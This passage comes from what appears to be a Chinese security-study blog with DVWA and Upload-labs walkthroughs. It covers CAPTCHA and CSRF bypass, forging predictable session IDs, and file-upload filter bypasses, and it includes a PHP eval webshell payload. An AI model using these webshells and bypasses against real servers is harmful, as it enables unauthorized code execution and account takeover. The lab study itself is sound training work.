src="/2021/02/26/dvwa/blog/source_posts\DVWA\1375459-20200424102602206-758466382.png" alt="1375459-20200424102602206-758466382"></p><p><strong>2.由于没有任何的防CSRF机制，我们可以轻易地构造攻击页面</strong><img src="/2021/02/26/dvwa/blog/source_posts\DVWA\1375459-20200424103739253-2010034458.png" alt="1375459-20200424103739253-2010034458"></p><p>当受害者访问这个页面时，攻击脚本会伪造改密请求发送给服务器。<img src="/2021/02/26/dvwa/blog/source_posts\DVWA\1375459-20200424103812914-454750515.png" alt="1375459-20200424103812914-454750515"></p><p>受害者会看到更改密码成功的界面</p><h2 id="Medium-4"><a href="#Medium-4" class="headerlink" title="Medium"></a>Medium</h2><pre><code>&lt;?phpif( isset( $_POST[ 'Change' ] ) &amp;&amp; ( $_POST[ 'step' ] == '1' ) ) {    // Hide the CAPTCHA form    $hide_form = true;    // Get input    $pass_new  = $_POST[ 'password_new' ];    $pass_conf = $_POST[ 'password_conf' ];    // Check CAPTCHA from 3rd party    $resp = recaptcha_check_answer(        $_DVWA[ 'recaptcha_private_key' ],        $_POST['g-recaptcha-response']    );    // Did the CAPTCHA fail?    if( !$resp ) {        // What happens when the CAPTCHA was entered incorrectly        $html     .= "&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;";        $hide_form = false;        return;    }    else {        // CAPTCHA was correct. Do both new passwords match?        if( $pass_new == $pass_conf ) {            // Show next stage for the user            $html .= "                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;                &lt;form action=\"#\" method=\"POST\"&gt;                    &lt;input type=\"hidden\" name=\"step\" value=\"2\" /&gt;                    &lt;input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" /&gt;                    &lt;input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" /&gt;                    &lt;input type=\"hidden\" name=\"passed_captcha\" value=\"true\" /&gt;                    &lt;input type=\"submit\" name=\"Change\" value=\"Change\" /&gt;                &lt;/form&gt;";        }        else {            // Both new passwords do not match.            $html     .= "&lt;pre&gt;Both passwords must match.&lt;/pre&gt;";            $hide_form = false;        }    }}if( isset( $_POST[ 'Change' ] ) &amp;&amp; ( $_POST[ 'step' ] == '2' ) ) {    // Hide the CAPTCHA form    $hide_form = true;    // Get input    $pass_new  = $_POST[ 'password_new' ];    $pass_conf = $_POST[ 'password_conf' ];    // Check to see if they did stage 1----检查passed_captcha参数值    if( !$_POST[ 'passed_captcha' ] ) {        $html     .= "&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;";        $hide_form = false;        return;    }    // Check to see if both password match    if( $pass_new == $pass_conf ) {        // They do!        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));        $pass_new = md5( $pass_new );        // Update database        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );        // Feedback for the end user        $html .= "&lt;pre&gt;Password Changed.&lt;/pre&gt;";    }    else {        // Issue with the passwords matching        $html .= "&lt;pre&gt;Passwords did not match.&lt;/pre&gt;";        $hide_form = false;    }    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);}?&gt;</code></pre><p>可以看到，Medium级别的代码依然将改密操作分成了两步，第一步检查用户输入的验证码，验证通过后，服务器返回表单，第二步客户端提交post请求，服务器完成更改密码的操作。与Low级别不同的是，在第二步验证时，增加了对参数passed_captcha的检查，如果参数值为true，则认为用户已经通过了验证码检查，然而用户依然可以通过伪造参数绕过验证，本质上来说，这与Low级别的验证没有任何区别。</p><p><strong>1.可以通过抓包，更改step参数，增加passed_captcha参数，绕过验证码。</strong><img src="/2021/02/26/dvwa/blog/source_posts\DVWA\1375459-20200424104918595-2017076591.png" alt="1375459-20200424104918595-2017076591"></p><p>改了</p><p><img src="/2021/02/26/dvwa/blog/source_posts\DVWA\1375459-20200424105017920-2107330620.png" alt="1375459-20200424105017920-2107330620"></p><h2 id="High-4"><a href="#High-4" class="headerlink" title="High"></a>High</h2><pre><code>&lt;?phpif( isset( $_POST[ 'Change' ] ) ) {    // Hide the CAPTCHA form    $hide_form = true;    // Get input    $pass_new  = $_POST[ 'password_new' ];    $pass_conf = $_POST[ 'password_conf' ];    // Check CAPTCHA from 3rd party    $resp = recaptcha_check_answer(        $_DVWA[ 'recaptcha_private_key' ],        $_POST['g-recaptcha-response']    );//（通过身份验证条件）或者 （参数g-recaptcha-respon为hidd3n_valu3并且参数 HTTP_USER_AGE为 reCAPTC）就算是验证通过了    if (        $resp ||         (            $_POST[ 'g-recaptcha-response' ] == 'hidd3n_valu3'            &amp;&amp; $_SERVER[ 'HTTP_USER_AGENT' ] == 'reCAPTCHA'        )    ){        // CAPTCHA was correct. Do both new passwords match?        if ($pass_new == $pass_conf) {            $pass_new = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));            $pass_new = md5( $pass_new );            // Update database            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "' LIMIT 1;";            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );            // Feedback for user            echo "&lt;pre&gt;Password Changed.&lt;/pre&gt;";        } else {            // Ops. Password mismatch            $html     .= "&lt;pre&gt;Both passwords must match.&lt;/pre&gt;";            $hide_form = false;        }    } else {        // What happens when the CAPTCHA was entered incorrectly        $html     .= "&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;";        $hide_form = false;        return;    }    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);}// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><p>可以看到，服务器的验证逻辑是当$resp（这里是指谷歌返回的验证结果）是true，或者 参数g-recaptcha-response等于hidd3n_valu3并且http包头的User-Agent参数等于reCAPTCHA 时，就认为验证码输入正确，通过了验证码的检查。</p><p>搞清楚了验证逻辑，剩下就是伪造绕过了，由于$resp参数我们无法控制，所以重心放在参数g-recaptcha-response、User-Agent上。</p><p><img src="/2021/02/26/dvwa/blog/source_posts\DVWA\1375459-20200424110756298-1402975162.png" alt="1375459-20200424110756298-1402975162"></p><p>更改参数g-recaptcha-response以及http包头的User-Agent：</p><p><img src="/2021/02/26/dvwa/blog/source_posts\DVWA\1375459-20200424110945251-1429280531.png" alt="1375459-20200424110945251-1429280531"></p><h2 id="Impossible-4"><a href="#Impossible-4" class="headerlink" title="Impossible"></a>Impossible</h2><pre><code>&lt;?phpif( isset( $_POST[ 'Change' ] ) ) {    // Check Anti-CSRF token----token验证    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );    // Hide the CAPTCHA form    $hide_form = true;    // Get input----对输入进行过滤、转义、md5    $pass_new  = $_POST[ 'password_new' ];    $pass_new  = stripslashes( $pass_new );    $pass_new  = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    $pass_new  = md5( $pass_new );    $pass_conf = $_POST[ 'password_conf' ];    $pass_conf = stripslashes( $pass_conf );    $pass_conf = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_conf ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    $pass_conf = md5( $pass_conf );    $pass_curr = $_POST[ 'password_current' ];    $pass_curr = stripslashes( $pass_curr );    $pass_curr = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_curr ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    $pass_curr = md5( $pass_curr );    // Check CAPTCHA from 3rd party----第三方校验验证码    $resp = recaptcha_check_answer(        $_DVWA[ 'recaptcha_private_key' ],        $_POST['g-recaptcha-response']    );    // Did the CAPTCHA fail?----第一步：如果第三方校验验证码正确，进行下一步    if( !$resp ) {        // What happens when the CAPTCHA was entered incorrectly        $html .= "&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;";        $hide_form = false;        return;    }    else {        // Check that the current password is correct----第二步：校验当前密码是否输入正确        $data = $db-&gt;prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );        $data-&gt;bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );        $data-&gt;bindParam( ':password', $pass_curr, PDO::PARAM_STR );        $data-&gt;execute();        // Do both new password match and was the current password correct?---第三步：如果新密码和确认密码相同，并且当前密码正确，进行下一步        if( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) {            // Update the database---第四步：更新密码            $data = $db-&gt;prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );            $data-&gt;bindParam( ':password', $pass_new, PDO::PARAM_STR );            $data-&gt;bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );            $data-&gt;execute();            // Feedback for the end user - success!            $html .= "&lt;pre&gt;Password Changed.&lt;/pre&gt;";        }        else {            // Feedback for the end user - failed!            $html .= "&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;";            $hide_form = false;        }    }}// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><p>可以看到，Impossible级别的代码增加了Anti-CSRF token 机制防御CSRF攻击，利用PDO技术防护sql注入，验证过程终于不再分成两部分了，验证码无法绕过，同时要求用户输入之前的密码，进一步加强了身份认证。</p><h1 id="Weak-Session-IDs（弱会话ID）"><a href="#Weak-Session-IDs（弱会话ID）" class="headerlink" title="Weak Session IDs（弱会话ID）"></a>Weak Session IDs（弱会话ID）</h1><p><img src="/2021/02/26/dvwa/blog/source_posts\DVWA\20201115163154911.jpg" alt="20201115163154911"></p><h4 id="session利用实质"><a href="#session利用实质" class="headerlink" title="session利用实质"></a>session利用实质</h4><p>当用户登陆后，在服务器端就会创建一个会话（Session），接着访问页面的时候就不用登陆，只需要携带Session去访问。SessionID作为特定用户访问站点所需的唯一内容。如果能够计算或轻易猜到该SessionID，则攻击者将可以轻易获取访问权限，无需登录密码直接进入特定用户界面，进而进行其他操作,如XSS、文件上传等。</p><h4 id="Session劫持"><a href="#Session劫持" class="headerlink" title="Session劫持 :"></a>Session劫持 :</h4><p>就是一种通过窃取用户SessionID，使用该SessionID登录进目标账户的攻击方法，此时攻击者实际上是使用了目标账户的有效Session。如果SessionID是保存在Cookie中的，则这种攻击可以称为Cookie劫持。SessionID还可以保存在URL中，作为一个请求的一个参数，但是这种方式的安全性难以经受考验</p><h2 id="Low-4"><a href="#Low-4" class="headerlink" title="Low"></a>Low</h2><pre><code>&lt;?php$html = "";if ($_SERVER['REQUEST_METHOD'] == "POST") {    if (!isset ($_SESSION['last_session_id'])) {        $_SESSION['last_session_id'] = 0;    }    //新的session_id加一    $_SESSION['last_session_id']++;    $cookie_value = $_SESSION['last_session_id'];    setcookie("dvwaSession", $cookie_value);}?&gt;</code></pre><p>可以看到，服务器端对sessionid的生成策略非常简单：</p><p>如果用户 SESSION中的 last_session_id 不存在就设为 0，存在就直接在原来的基础上加1。</p><p>这种是肯定不行的。太容易被人伪造，而且不能保证每个人的session是不一样的，容易造成冲突。</p><p>点Generate，按F12查看headers信息，可以看到</p><p>请求头</p><p>Cookie: dvwaSession=1; security=low; PHPSESSID:”hm1dnto8dfos480282k229f3j3”</p><p>响应头</p><p>Set-Cookie: dvwaSession=3</p><p><img src="/2021/02/26/dvwa/blog/source_posts\DVWA\查看session_id.png" alt="查看session_id"></p><p>同样可以使用burp抓包</p><p><img src="/2021/02/26/dvwa/blog/source_posts\DVWA\burp抓cookie.png" alt="burp抓cookie"></p><p>然后firefox+hackbar修改cookie：</p><p><img src="/2021/02/26/dvwa/blog/source_posts\DVWA\hackbar修改cookie.png" alt="hackbar修改cookie"></p><p>没有输入用户名密码，直接进来，也就是说我们只要猜到sessionID，就一直绕过用户名密码</p><h2 id="Medium-5"><a href="#Medium-5" class="headerlink" title="Medium"></a>Medium</h2><pre><code>&lt;?php$html = "";if ($_SERVER['REQUEST_METHOD'] == "POST") {    $cookie_value = time();    setcookie("dvwaSession", $cookie_value);}?&gt;</code></pre><p>从服务器端的代码来看，将SessionID的值改成了服务器的当前时间，看起来比low的随机了点，但是经过连续的收集后就很容易发现其中的规律。知道时间那我们就可以骗A在某个时间点进行点击，然后你在一个大概的范围去试试。</p><p><img src="/2021/02/26/dvwa/blog/source_posts\DVWA\抓包.png" alt="抓包"></p><p>dvwaSession=1615022375; security=medium; PHPSESSID=hm1dnto8dfos480282k229f3j3</p><p>在另一个浏览器上访问这个网址，抓包，添加Cookie如下</p><p>dvwaSession=1615022400; security=medium; PHPSESSID=hm1dnto8dfos480282k229f3j3</p><p>使用时间戳在线查询工具就可以伪造啦</p><p><a href="https://tool.lu/timestamp/">https://tool.lu/timestamp/</a></p><h2 id="High-5"><a href="#High-5" class="headerlink" title="High"></a>High</h2><pre><code>&lt;?php$html = "";if ($_SERVER['REQUEST_METHOD'] == "POST") {    if (!isset ($_SESSION['last_session_id_high'])) {        $_SESSION['last_session_id_high'] = 0;    }    $_SESSION['last_session_id_high']++;    $cookie_value = md5($_SESSION['last_session_id_high']);    setcookie("dvwaSession", $cookie_value, time()+3600, "/vulnerabilities/weak_id/", $_SERVER['HTTP_HOST'], false, false);}?&gt;</code></pre><p>这里将dvwaSession的值进行了md5计算，并且还设置了dvwaSession的有效期进一步增加安全性，但不足的是本级与低级代码一样，都是通过0开始累加的，若有经验的人在多次尝试后，很容易看出来其中的规律。</p><p>![weakid high 抓包](D:\blog\source_posts\DVWA\weakid high 抓包.png)</p><p>32位字符。由0-9和a-f组成猜想应该是MD5，拿到网站去解密，为2，再测试几次，发现就是如low一样从0开始每次加1，然后经过MD5加密，作为SessionID。依旧在另一个浏览器上访问这个网址，抓包，添加上Cookie。成功访问。</p><h2 id="Impossible-5"><a href="#Impossible-5" class="headerlink" title="Impossible"></a>Impossible</h2><pre><code>&lt;?php$html = "";if ($_SERVER['REQUEST_METHOD'] == "POST") {    $cookie_value = sha1(mt_rand() . time() . "Impossible");    setcookie("dvwaSession", $cookie_value, time()+3600, "/vulnerabilities/weak_id/", $_SERVER['HTTP_HOST'], true, true);}?&gt;</code></pre><p>Impossible级别使用随机数+时间戳+固定字符串（”Impossible”）进行 sha1 运算，作为 session id，几乎不可能被破解。</p><p>而 tomcat 的 session id 值生成的策略，是一个随机数+时间+ jvm 的id值（jvm的id值会根据服务器的硬件信息计算得来），如果出现冲突就会再生成一个。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Uploadlabs</title>
      <link href="2021/02/23/uploadlabs/"/>
      <url>2021/02/23/uploadlabs/</url>
      
        <content type="html"><![CDATA[<h2 id="Pass-1-js检查"><a href="#Pass-1-js检查" class="headerlink" title="Pass-1 js检查"></a>Pass-1 js检查</h2><pre><code>function checkFile() {    var file = document.getElementsByName('upload_file')[0].value;    if (file == null || file == "") {        alert("请选择要上传的文件!");        return false;    }    //定义允许上传的文件类型    var allow_ext = ".jpg|.png|.gif";    //提取上传文件的类型    var ext_name = file.substring(file.lastIndexOf("."));    //判断上传文件类型是否允许上传    if (allow_ext.indexOf(ext_name + "|") == -1) {        var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;        alert(errMsg);        return false;    }}</code></pre><h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><p>尝试前端绕过，在前端js判断函数中加上可以上传php文件,修改为：</p><pre class=" language-.php"><code class="language-.php">var allow_ext = ".jpg|.png|.gif|.php";</code></pre><p>然后访问</p><pre><code>127.0.0.1/upload-labs/upload/1.php</code></pre><h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><p>或者用burp抓包修改文件类型（上传1.jpg修改为1.php）</p><p>现在文件夹中编写php文件改成jpg格式</p><pre><code>&lt;?php@eval($_post[a]);echo 'flag';fputs(fopen('shell.php','w'),'&lt;?php @eval($_post[a]);?&gt;');?&gt;</code></pre><p>然后在burp中吧jpg改成php</p><h2 id="Pass-2-只验证Content-type"><a href="#Pass-2-只验证Content-type" class="headerlink" title="Pass-2 只验证Content-type"></a>Pass-2 只验证Content-type</h2><pre><code>$is_upload = false;$msg = null;if (isset($_POST['submit'])) {    if (file_exists($UPLOAD_ADDR)) {        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) {                $img_path = $UPLOAD_ADDR . $_FILES['upload_file']['name'];                $is_upload = true;            }        } else {            $msg = '文件类型不正确，请重新上传！';        }    } else {        $msg = $UPLOAD_ADDR.'文件夹不存在,请手工创建！';    }}</code></pre><p>仅仅判断content-type类型，因此上传1.php抓包修改content-type为图片类型：image/jpeg、image/png、image/gif</p><h2 id="Pass-3-黑名单绕过"><a href="#Pass-3-黑名单绕过" class="headerlink" title="Pass-3 黑名单绕过"></a>Pass-3 黑名单绕过</h2><pre><code>$is_upload = false;$msg = null;if (isset($_POST['submit'])) {    if (file_exists($UPLOAD_ADDR)) {        $deny_ext = array('.asp','.aspx','.php','.jsp');        $file_name = trim($_FILES['upload_file']['name']);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, '.');        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //收尾去空        if(!in_array($file_ext, $deny_ext)) {            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR. '/' . $_FILES['upload_file']['name'])) {                 $img_path = $UPLOAD_ADDR .'/'. $_FILES['upload_file']['name'];                 $is_upload = true;            }        } else {            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';        }    } else {        $msg = $UPLOAD_ADDR . '文件夹不存在,请手工创建！';    }}</code></pre><p>用黑名单不允许上传<code>.asp,.aspx,.php,.jsp</code>后缀的文件<br> 但可以上传<code>.phtml .phps .php5 .pht</code><br> 前提是apache的httpd.conf中有如下配置代码</p><pre><code>AddType application/x-httpd-php .php .phtml .phps .php5 .pht</code></pre><p>因此抓包修改为1.php5上传，回复包里有上传路径</p><h2 id="Pass-4-htaccess绕过"><a href="#Pass-4-htaccess绕过" class="headerlink" title="Pass-4 .htaccess绕过"></a>Pass-4 .htaccess绕过</h2><pre><code>$is_upload = false;$msg = null;if (isset($_POST['submit'])) {    if (file_exists($UPLOAD_ADDR)) {        $deny_ext = array(".php",".php5",".php4",".php3",".php2","php1",".html",".htm",".phtml",".pHp",".pHp5",".pHp4",".pHp3",".pHp2","pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf");        $file_name = trim($_FILES['upload_file']['name']);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, '.');        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //收尾去空        if (!in_array($file_ext, $deny_ext)) {            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) {                $img_path = $UPLOAD_ADDR . $_FILES['upload_file']['name'];                $is_upload = true;            }        } else {            $msg = '此文件不允许上传!';        }    } else {        $msg = $UPLOAD_ADDR . '文件夹不存在,请手工创建！';    }}</code></pre><p> 绕过方法</p><p>上传.htaccess文件（<em>注: .htaccess文件生效前提条件为1.mod_rewrite模块开启。2.AllowOverride All</em>）</p><h4 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title=".htaccess文件"></a>.htaccess文件</h4><p>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。</p><p>文件内容为AddType application/x-httpd-php .jpg使jpg文件用解析成php</p><h2 id="Pass-5-大小写绕过"><a href="#Pass-5-大小写绕过" class="headerlink" title="Pass-5 大小写绕过"></a>Pass-5 大小写绕过</h2><pre><code>$is_upload = false;$msg = null;if (isset($_POST['submit'])) {    if (file_exists($UPLOAD_ADDR)) {        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");        $file_name = trim($_FILES['upload_file']['name']);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, '.');        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空        if (!in_array($file_ext, $deny_ext)) {            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) {                $img_path = $UPLOAD_ADDR . '/' . $file_name;                $is_upload = true;            }        } else {            $msg = '此文件不允许上传';        }    } else {        $msg = $UPLOAD_ADDR . '文件夹不存在,请手工创建！';    }}</code></pre><p>相比于pass-4，过滤了.htaccess，但将后缀转换为小写去掉了，因此可以使用大小绕过</p><p>改成1.PHP</p><h2 id="Pass-6-空格绕过"><a href="#Pass-6-空格绕过" class="headerlink" title="Pass-6 空格绕过"></a>Pass-6 空格绕过</h2><pre><code>$is_upload = false;$msg = null;if (isset($_POST['submit'])) {    if (file_exists($UPLOAD_ADDR)) {        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");        $file_name = trim($_FILES['upload_file']['name']);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, '.');        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA        if (!in_array($file_ext, $deny_ext)) {            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) {                $img_path = $UPLOAD_ADDR . '/' . $file_name;                $is_upload = true;            }        } else {            $msg = '此文件不允许上传';        }    } else {        $msg = $UPLOAD_ADDR . '文件夹不存在,请手工创建！';    }}</code></pre><p>这题没有对后缀名进行去空，因此可以在后缀名加空格绕过</p><h2 id="Pass-7-点绕过"><a href="#Pass-7-点绕过" class="headerlink" title="Pass-7 点绕过"></a>Pass-7 点绕过</h2><pre><code>$is_upload = false;$msg = null;if (isset($_POST['submit'])) {    if (file_exists($UPLOAD_ADDR)) {        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");        $file_name = trim($_FILES['upload_file']['name']);        $file_ext = strrchr($file_name, '.');        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空        if (!in_array($file_ext, $deny_ext)) {            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) {                $img_path = $UPLOAD_ADDR . '/' . $file_name;                $is_upload = true;            }        } else {            $msg = '此文件不允许上传';        }    } else {        $msg = $UPLOAD_ADDR . '文件夹不存在,请手工创建！';    }}</code></pre><p>没有对后缀名末尾的点进行处理，利用windows特性，会自动去掉后缀名中最后的”.”，在burp中可在后缀名中加”.”绕过：</p><h2 id="Pass-8-DATA绕过"><a href="#Pass-8-DATA绕过" class="headerlink" title="Pass-8 ::$DATA绕过"></a>Pass-8 ::$DATA绕过</h2><pre><code>$is_upload = false;$msg = null;if (isset($_POST['submit'])) {    if (file_exists($UPLOAD_ADDR)) {        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");        $file_name = trim($_FILES['upload_file']['name']);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, '.');        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = trim($file_ext); //首尾去空        if (!in_array($file_ext, $deny_ext)) {            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) {                $img_path = $UPLOAD_ADDR . '/' . $file_name;                $is_upload = true;            }        } else {            $msg = '此文件不允许上传';        }    } else {        $msg = $UPLOAD_ADDR . '文件夹不存在,请手工创建！';    }}</code></pre><p>没有对后缀名中的’::$DATA’进行过滤。在php+windows的情况下：如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。利用windows特性，可在后缀名中加” ::$DATA”绕过：</p><p>在burp中改为</p><pre><code>1.php::$DATA</code></pre><h2 id="Pass-9-点-空格-点绕过"><a href="#Pass-9-点-空格-点绕过" class="headerlink" title="Pass-9 点+空格+点绕过"></a>Pass-9 点+空格+点绕过</h2><pre><code>$is_upload = false;$msg = null;if (isset($_POST['submit'])) {    if (file_exists($UPLOAD_ADDR)) {        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");        $file_name = trim($_FILES['upload_file']['name']);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, '.');        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空        if (!in_array($file_ext, $deny_ext)) {            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) {                $img_path = $UPLOAD_ADDR . '/' . $file_name;                $is_upload = true;            }        } else {            $msg = '此文件不允许上传';        }    } else {        $msg = $UPLOAD_ADDR . '文件夹不存在,请手工创建！';    